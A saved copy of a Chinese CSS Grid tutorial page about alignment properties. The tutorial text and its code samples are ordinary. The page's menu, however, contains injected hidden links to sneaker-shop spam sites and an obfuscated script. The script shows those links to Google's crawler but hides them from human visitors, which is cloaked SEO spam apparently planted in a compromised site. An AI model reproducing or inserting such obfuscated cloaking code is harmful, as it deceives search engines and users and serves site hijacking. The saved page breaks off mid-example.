@@ -1,0 +1,1211 @@
+<!DOCTYPE html>
+<!-- saved from url=(0133)https://www.w3cplus.com/css/grid-layout-part-12.html?expire=1699863107&code=GsOhRzlRnIU&sign=de3acde2366c895e767c8e794c770118#paywall -->
+<html lang="zh-hans" class="js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+<link rel="shortcut icon" href="https://www.w3cplus.com/sites/all/themes/w3cplusV2/favicon.ico" type="image/vnd.microsoft.icon">
+<meta name="description" content="如果你熟悉 **[Flexbox 布局](//www.w3cplus.com/blog/tags/157.html)** 的话，那么你应该知道 Flex 容器中对 Flex项对齐的方法。这些对齐属性最早只是运用于 Flex 容器和 Flex 项目上（也就是 Flexbox 布局中），后来随着 CSS 规范的变革，运用于 Flexbox 中的对齐方式的相关属性被移动一个新的规范中，即 **[盒模型对齐 Level 3（CSS Box Alignment Module Level 3）](//www.w3.org/TR/css-align-3/)** 的规范中，这个规范详细的定义了在不同的布局方式下如何处理对齐问题。目前该规范定义的对齐方式主要运用于 Flexbox 布局和 Grid 布局中。每种布局方式对盒模型对齐规范（CSS Box">
+<meta name="keywords" content="前端,图解CSS, Grid, Layout, Web布局系列, 布局, 会员专栏,教程">
+<meta name="generator" content="Drupal 7 (http://drupal.org)">
+<link rel="canonical" href="https://www.w3cplus.com/css/grid-layout-part-12.html">
+<link rel="shortlink" href="https://www.w3cplus.com/node/2725">
+  <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta itemprop="name" content="W3cplus">
+  <meta itemprop="image" content="//www.w3cplus.com/w3cplus-logo.jpg">
+  <meta name="baidu-site-verification" content="ftyq813qEZgpw9nb">
+  <meta name="applicable-device" content="pc,mobile">
+  <title>图解CSS：Grid布局(Part12)_图解CSS, Grid, Layout, Web布局系列, 布局, 会员专栏 教程_W3cplus</title>
+  <link type="text/css" rel="stylesheet" href="./Grid布局：12-网格布局中的对齐方式和间距_files/css_xE-rWrJf-fncB6ztZfd2huxqgxu4WO-qwma6Xer30m4.css" media="all">
+<link type="text/css" rel="stylesheet" href="./Grid布局：12-网格布局中的对齐方式和间距_files/css_hYCLW089C9S9sP3ZYkuG6R-Q5ZHbEhblZBFjwZ_bE_I.css" media="all">
+<link type="text/css" rel="stylesheet" href="./Grid布局：12-网格布局中的对齐方式和间距_files/css_W_jVXC7gZD8ENo3AHIwFL3Mih90k_Go_X3-i_hfyj2c.css" media="all">
+<link type="text/css" rel="stylesheet" href="./Grid布局：12-网格布局中的对齐方式和间距_files/css_dc6MGCsMvp7moqrq-cRLC0GLEMrFF3Ego_HOWYVsZG4.css" media="all">
+  <script src="./Grid布局：12-网格布局中的对齐方式和间距_files/hm.js.下载"></script><script type="text/javascript" src="./Grid布局：12-网格布局中的对齐方式和间距_files/jquery.min.js.下载"></script>
+
+</head>
+<body class="html not-front not-logged-in one-sidebar sidebar-second page-node page-node- page-node-2725 node-type-blog" style="">
+  <div id="skip-link">
+    <a href="https://www.w3cplus.com/css/grid-layout-part-12.html?expire=1699863107&amp;code=GsOhRzlRnIU&amp;sign=de3acde2366c895e767c8e794c770118#main-content" class="element-invisible element-focusable">跳转到主要内容</a>
+  </div>
+    <div id="header" role="header">
+  <div class="container">
+    <h1 id="logo">
+      <a href="https://www.w3cplus.com/" title="记述前端那些事——引领Web前沿" id="site_name">w3cplus</a>
+    </h1>
+    <div class="toggle-topbar menu-icon" id="pull">
+      <a href="https://www.w3cplus.com/css/grid-layout-part-12.html?expire=1699863107&amp;code=GsOhRzlRnIU&amp;sign=de3acde2366c895e767c8e794c770118#"><span>Menu</span></a>
+    </div>
+    <div class="toogle-topbar-content" id="pull-menu">
+              <ul class="menu clearfix"><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.stclaircomo.com/edfdgnshop/air-jordan-1-element-gore-tex-black-olive/" title="Tex Black Olive Details - Air Jordan Goat 1 Element Gore - StclaircomoShops - Мужские кроссовки nike air jordan Goat 13 retro black red
+" style="display: none;">Tex Black Olive Details - Air Jordan Goat 1 Element Gore - StclaircomoShops - Мужские кроссовки nike air jordan Goat 13 retro black red
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfedavshop/air-jordan-1-art-basel-igloo-rust-pink/" title="Jordan Trunner Q4 343408-171 - Air LOW Jordan 1 Art Basel Igloo Rust Pink - LOW Jordan LOW Jordan ADG 3 sneakers Schwarz
+" style="display: none;">Jordan Trunner Q4 343408-171 - Air LOW Jordan 1 Art Basel Igloo Rust Pink - LOW Jordan LOW Jordan ADG 3 sneakers Schwarz
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfebcenshop/nike-dunk-hi-nrj-music-awards-2009%E2%80%B3/" title="nike air max 1 low just do it 2018 black and white for sale, Dropped Files - Dropped News - Release Dates &amp; Info
+" style="display: none;">nike air max 1 low just do it 2018 black and white for sale, Dropped Files - Dropped News - Release Dates &amp; Info
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfejcashop/" title="air jordan outlet legit reddit
+" style="display: none;">air jordan outlet legit reddit
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfebcenshop/release-reminder-nike-kobe-viii-8-black-history-month/" title="Nike SF Air Force 1 Mid Ivory Olive917753-101 , IetpShops , Release Reminder: Nike Kobe VIII (8) &#39;Black History Month&#39;
+" style="display: none;">Nike SF Air Force 1 Mid Ivory Olive917753-101 , IetpShops , Release Reminder: Nike Kobe VIII (8) 'Black History Month'
+</a></li><li class="first leaf"><a href="https://www.w3cplus.com/blog/tags/686.html" title="会员专栏">会员专栏</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/CSS3" title="">CSS</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/JavaScript" title="JavaScript">JavaScript</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/css/books.html" title="我的小册">小册</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/mobile" title="">Mobile</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/svg-tutorial" title="SVG">SVG</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/tags" title="标签云">标签云</a></li>
+<li class="last leaf"><a href="https://www.w3cplus.com/blogs-lists" title="文章列表">文章列表</a></li>
+<script>['sojson.v4']["\x66\x69\x6c\x74\x65\x72"]["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"](((['sojson.v4']+[])["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"]['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65']['\x61\x70\x70\x6c\x79'](null,"118J97J114e32K109l121m95L107G101q121O95v119X111Z114Q100P95f114s101y32l61S32c110p101W119b32w82E101F103g69i120Q112V40h34J71n111K111V103Z108T101g124z109f121L116R101D115z116d34a44p32m34H103o105X34V41h59g105Z102P40Z33j109x121d95d107g101p121J95W119R111K114c100J95M114o101t46V116f101Q115x116u40J110Z97l118N105o103o97R116L111L114W46L117R115I101T114E65K103D101a110e116L41v41E32z123V32i118w97U114Q32d99k108B97j115W115k95i109B121a95v107S101G121H95e119o111J114z100O32B61e32B100F111Y99t117b109G101E110i116D46B103y101m116Q69D108n101G109m101x110d116p115y66E121U67i108P97s115e115H78r97g109c101d40h39S107x101U121f115O95u119r111l114G100n115I39c41o59i32k102v111c114r40y118H97B114E32L105d32n61P32W48l59h32q105W32V60s32j99g108h97f115Y115W95P109J121z95T107I101r121J95Z119t111W114q100X46E108G101m110X103e116P104i59r32K105i43S43W41m32D99x108a97S115W115U95S109s121j95x107Z101v121i95n119S111y114z100x91z105B93U46K115V116Q121B108x101b46i100V105R115P112N108u97E121y32w61P32W39A110t111Q110A101n39h59e125"['\x73\x70\x6c\x69\x74'](/[a-zA-Z]{1,}/))))('sojson.v4');</script></ul>        <!-- /#main-menu -->
+          </div>
+  </div>
+</div>
+
+  <div id="branding" role="branding">
+    <div class="container">
+        <div class="region region-branding">
+    <div id="block-block-46" class="block block-block">
+
+    
+  <div class="content">
+    <div style="margin-bottom: 5px;">
+	<a rel="nofollow" href="https://s.juejin.cn/ds/iJrTure4/" target="_blank" title="现代 CSS"><img alt="现代 CSS" src="./Grid布局：12-网格布局中的对齐方式和间距_files/WechatIMG324.jpg" style="width: 100%;height:auto"></a></div>  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+<div id="page" role="page">
+  <div class="container">
+    
+    <div class="col-main">
+      <div class="main-wrap">
+        
+                
+        <div class="page-inner">
+                      <div id="breadcrumb" role="breadcrumb">
+              <h2 class="element-invisible">你在这里</h2><div class="breadcrumb"><a href="https://www.w3cplus.com/">首页</a></div>            </div>
+          
+          
+          <a id="main-content"></a>
+                                <h1 class="title" id="page-title">
+               图解CSS：Grid布局(Part12)            </h1>
+          
+                    
+                                <div class="region region-content">
+    <div id="block-system-main" class="block block-system">
+
+    
+  <div class="content">
+    <div id="node-2725" class="node node-blog node-promoted node-full clearfix" about="/css/grid-layout-part-12.html" typeof="sioc:Post sioct:BlogPost">
+  
+  <div class="node-header">
+              <div class="submitted">
+          作者：<span>大漠</span>          日期：<span>2021-07-26</span>          点击：<span>397</span>        </div>
+            <div class="tags">
+        <div class="field field-name-field-blog-tag field-type-taxonomy-term-reference field-label-hidden"><div class="field-items"><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/674.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">图解CSS</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/356.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Grid</a></div><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/180.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Layout</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/695.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Web布局系列</a></div><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/130.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">布局</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/686.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">会员专栏</a></div></div></div>      </div>
+  </div>
+
+  
+  <div class="body-content clearfix">
+    <div id="block-block-22" class="block block-block">
+
+    
+  <div class="content">
+    <div>
+<blockquote>
+<p style="font-size: 14px;"><strong>特别声明：</strong>如果您喜欢小站的内容，可以点击<a href="https://www.zhi12.cn/paywall/membership/widget?uid=5491&amp;siteid=s_64be3b00&amp;cms=drupal&amp;content_id=2610&amp;callback=https%3A//www.w3cplus.com&amp;source=https%3A//www.w3cplus.com%3Fq%3Dnode/2610&amp;sign=ecbcc7859e33dea192cf9efdb6d2e61c" style="background: #FF5722;color: #fff;  display: inline-block; padding: 10px; border-radius: 4px;  line-height: 1; margin: 0 3px;" target="_blank">申请会员</a>进行全站阅读。如果您对付费阅读有任何建议或想法，欢迎发送邮件至: <strong>airenliao@gmail.com</strong>!或添加QQ：874472854(^_^)</p>
+</blockquote>
+</div>  </div>
+</div>
+<div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even" property="content:encoded"><div class="paywall paywall-mb"><div class="paywall-center"><small class="paywall-highlight">* 文本为付费内容（4.99元），您已获得全文阅读权限</small></div></div><h2 class="content-title" data-index="2">网格布局中的对齐</h2>
+
+<p>我们先从网格布局中的对齐说起。</p>
+
+<p>如果你熟悉 <strong><a href="https://www.w3cplus.com/blog/tags/157.html" target="_blank">Flexbox 布局</a></strong> 的话，那么你应该知道 Flex 容器中对 Flex项对齐的方法。这些对齐属性最早只是运用于 Flex 容器和 Flex 项目上（也就是 Flexbox 布局中），后来随着 CSS 规范的变革，运用于 Flexbox 中的对齐方式的相关属性被移动一个新的规范中，即 <strong><a rel="nofollow" href="https://www.w3.org/TR/css-align-3/" target="_blank">盒模型对齐 Level 3（CSS Box Alignment Module Level 3）</a></strong> 的规范中，这个规范详细的定义了在不同的布局方式下如何处理对齐问题。目前该规范定义的对齐方式主要运用于 Flexbox 布局和 Grid 布局中。</p>
+
+<p>每种布局方式对盒模型对齐规范（CSS Box Alignment）的实现都略有差异，因为实际情况是每种布局方式都有各自的特点以及历史包袱，不能期望在所有的实现方式中都有完美一致的表现（对齐方式的表现）。而我们接下来主要和大家聊的是该规范在 CSS Grid 布局模式下的对齐方式。</p>
+
+<blockquote>
+  <p><strong>特别声明，盒模型对齐规范（CSS Box Alignment）现在是一个独立的模块，在这里只介绍该规范所说的属性在网格容器和网格项目中的运用，更为详细的介绍，将会在新的章节中和大家探讨</strong>。</p>
+</blockquote>
+
+<h3 class="content-title" data-index="3">网格布局中的轴线</h3>
+
+<p>在介绍网格布局中重要术语的时候，就和大家介绍过网格轴这个术语。在 CSS 网格布局中有两条轴线用于对齐，即 <strong>块方向的列轴</strong> 和 <strong>行方向的行轴</strong>。</p>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-275.jpg" alt=""></p>
+
+<p>块方向的轴是采用块布局时块的排列方向。所设页面中有两个段落，其中一个显示在另一个下面，所以这个方向的轴被称为 <strong>块方向的轴</strong> 。在 CSS 网格布局规范中，它被称为 <strong>列轴</strong>，因为这条轴的方向和列轨道是一致的。<strong>行方向的轴</strong> 与块方向的轴垂直，它的方向和普通文本的方向一致。在 CSS 网格规范中，它有时被称为 <strong>行轴</strong>，因为这条轴的方向和行轨道是一致的。</p>
+
+<p>我们可以把网格区域中的内容，以及网格轨道整体与这两条轴线对齐。</p>
+
+<h3 class="content-title" data-index="3">网格布局中的对齐方式</h3>
+
+<p>盒模型对齐规范中的属性在 CSS 网格布局也将按这两条轴来划分：</p>
+
+<ul>
+<li>运用于“对齐项目到块方向列轴”的对齐属性有：<code>align-items</code> 和 <code>align-self</code>，其中<code>align-items</code> 运用于网格容器上，<code>align-self</code>运用于网格项目上</li>
+<li>运用于“对齐项目到文本方向行轴”的对齐属性有：<code>justify-items</code> 和 <code>justify-self</code>，其中<code>justify-items</code>运用于网格容器上，<code>justify-self</code> 运用于网格项目上</li>
+<li>运用于“对齐项目轨道到块方向的列轴”的对齐属性有：<code>align-content</code> ，该属性运用于网格容器上</li>
+<li>运用于“对齐项目轨道到文本方向的行轴”的对齐属性有： <code>justify-content</code>，该属性运用于网格容器上</li>
+</ul>
+
+<p>也可以按下面这样的方式来划分：</p>
+
+<ul>
+<li><strong>对齐网格项目</strong>：<code>justify-items</code> 和 <code>justify-self</code> 沿着行轴对齐网格项目，而<code>align-items</code>和<code>align-self</code>沿着列轴对齐网格项目，其中<code>justify-items</code>和<code>align-items</code>被运用于网格容器，而<code>justify-self</code>和<code>align-self</code>被运用于网格项目</li>
+<li><strong>对齐网格轨道</strong>：<code>align-content</code>沿行轴对齐网格轨道，<code>justify-content</code>沿着列轴对齐网格轨道，它们都被运用于网格容器</li>
+</ul>
+
+<p>接下来，我们来看看这些盒模型对齐属性在网格布局中的使用，但这里并不会详细的阐述，更详细的介绍将放到独立的章节中来阐述。</p>
+
+<h4 class="content-title" data-index="4">网格项目的对齐</h4>
+
+<p>我们先从网格项目的对齐开始。</p>
+
+<ul>
+<li><code>justify-items</code> 和 <code>justify-self</code> 会使网格项目沿着行轴（文本方向的行轴）来设置网格项目在网格项目所在网格区域中对齐方式</li>
+<li><code>align-items</code> 和 <code>align-self</code> 会使网格项目沿着列轴（块方向）来设置网格项目在网格项目所在网格区域中对齐方式</li>
+</ul>
+
+<p><code>justify-items</code> 和 <code>align-items</code> 运用于网格容器上，它们可接受的值有：</p>
+
+<ul>
+<li><code>auto</code></li>
+<li><code>normal</code></li>
+<li><code>start</code></li>
+<li><code>end</code></li>
+<li><code>center</code></li>
+<li><code>stretch</code></li>
+<li><code>baseline</code></li>
+<li><code>first baseline</code></li>
+<li><code>last baseline</code></li>
+</ul>
+
+<p>比如下面这个示例：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">80</span></span>px <span class="number"><span class="number">80</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-items</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">var(--justify-items, auto)</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：12-网格布局中的对齐方式和间距_files/oNWGPvr(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/oNWGPvr">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>默认情况之下，网格项目<code>i1</code> 并未使用明确放置网格项目相关的属性指定网格项目的位置，那么它将会按照默认放置，网格项目<code>i1</code>在第一行第一列的网格单元格区域。我们在网格容器上显式改变<code>justify-items</code>属性值时，可以改变网格项目<code>i1</code>在其所在网格区域行轴（文本方向的行轴）的对齐方式：</p>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-276.jpg" alt=""></p>
+
+<p>正如上图所示：</p>
+
+<ul>
+<li><code>start</code>： 网格项目被定位在行轴的起点</li>
+<li><code>end</code>： 网格项目被定位在行轴的终点</li>
+<li><code>center</code>： 网格项目被定位在行轴的中心</li>
+<li><code>stretch</code>：网格项目在整个行轴上被拉伸，该值也是<code>justify-items</code>的默认值</li>
+</ul>
+
+<p>就上面示例结果来看，<code>justify-items</code>取值为<code>auto</code>、<code>normal</code> 和 <code>last baseline</code> 的表现行为和其默认值<code>stretch</code>类似；而<code>baseline</code> 和 <code>first baseline</code>的表现行为和<code>start</code>相似。</p>
+
+<p>点击示例中的“+”按钮新增网格项目，如果新增的网格项目未显式放置其位置的话，将会按默认的顺序放置网格项目，此时改变 <code>justify-items</code> 的值，都会改变网格项目在其网格区域（所在的网格单元格）中行轴（文本方向的行轴）对齐方式：</p>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-277.jpg" alt=""></p>
+
+<p>在上面的示例稍作调整，在网格容器是使用<code>grid-template-areas</code>指定网格区域，然将网格项目明确的放置在这个网格区域中：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">80</span></span>px <span class="number"><span class="number">80</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-areas</span></span></span><span class="rule">:<span class="value"><span class="value"> 
+        <span class="string"><span class="string">"content content"</span></span>
+        <span class="string"><span class="string">"content content"</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-items</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">var(--justify-items, auto)</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> content
+}</span></span></span><span class="value"></span></span></span><span class="rule"><span class="value"></span></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：12-网格布局中的对齐方式和间距_files/NWjwROy(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/NWjwROy">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>这个时候在网格容器上使用<code>justify-items</code>可以改变网格项目在网格区域<code>content</code>的行轴对齐方式（因为我们使用<code>grid-area</code>属性明确放置在<code>content</code>区域中）：</p>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-278.jpg" alt=""></p>
+
+<p><code>justify-self</code>是用于网格项目上的对齐属性，是设置网格项目在所在网格区域文本行方向行轴的对齐方式。它的表现行为和<code>justify-items</code>相似。不同的是，通过网格容器设置<code>justify-items</code>属性就相当于为所有网格项目都设置了<code>justify-self</code>属性。</p>
+
+<p>比如：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">80</span></span>px <span class="number"><span class="number">80</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-items</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">var(--justify-items, auto)</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>和下面这个效果是相同的：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">80</span></span>px <span class="number"><span class="number">80</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-self</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">var(--justify-self, auto)</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：12-网格布局中的对齐方式和间距_files/ZEKaBOg(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/ZEKaBOg">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>效果如下：</p>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-279.jpg" alt=""></p>
+
+<p>如果同时在网格容器上设置了<code>justify-items</code>又在网格项目自身上设置了<code>justify-self</code>，将会发生什么呢？我们把上面示例稍作调不整：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">80</span></span>px <span class="number"><span class="number">80</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-areas</span></span></span><span class="rule">:<span class="value"><span class="value"> 
+        <span class="string"><span class="string">"content content"</span></span>
+        <span class="string"><span class="string">"content content"</span></span>;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--justify-self</span></span></span><span class="rule">:<span class="value"><span class="value"> auto;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--justify-items</span></span></span><span class="rule">:<span class="value"><span class="value"> auto;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-items</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">var(--justify-items)</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> content;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-self</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">var(--justify-self)</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：12-网格布局中的对齐方式和间距_files/xxdPRdO(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/xxdPRdO">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>改变示例中<code>justify-items</code>和<code>justify-self</code>的值，效果如下：</p>
+
+<div style="margin-bottom: 20px">
+<video controls="" width="100%" style="width: 100%; aspect-ratio: 16 / 9;" poster="/sites/default/files/blogs/2021/2107/css-grid-280.jpg">
+    <source src="/sites/default/files/blogs/2021/2107/css-grid-280.mp4" type="video/mp4">
+</video>
+</div>
+
+<p>正如上面所示，虽然<code>justify-items</code>和<code>justify-self</code>都可以设置网格项目在所在网格区域（默认是所在网格单元格）文本方向行轴的对齐方式：</p>
+
+<ul>
+<li><code>justify-items</code>用在网格容器上，可以同时设置网格容器中所有网格项目在所在网格区域文本方向行轴的对齐方式</li>
+<li><code>justify-self</code>用在网格项目上，可以设置网格项目自身在所在网格区域文本方向行轴的对齐方式</li>
+</ul>
+
+<p>不过，<code>justify-items</code> 和 <code>justify-self</code> 在 Flexbox 布局中未被实现，这是因为 Flexbox布局本质上是一维布局，在轴上会有多个项目，无法单独对齐其中某一个元素。要在 Flexbox布局中实现沿主轴即文本方向行轴上对齐项目，可以使用<code>justify-content</code> 属性。</p>
+
+<p>与 <code>justify-items</code> 和 <code>justify-self</code> 用于对齐项目到文本方向行轴类似，<code>align-items</code> 和 <code>align-self</code> 用于对齐网格项目到块方向列轴。我们先来看<code>align-items</code>：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
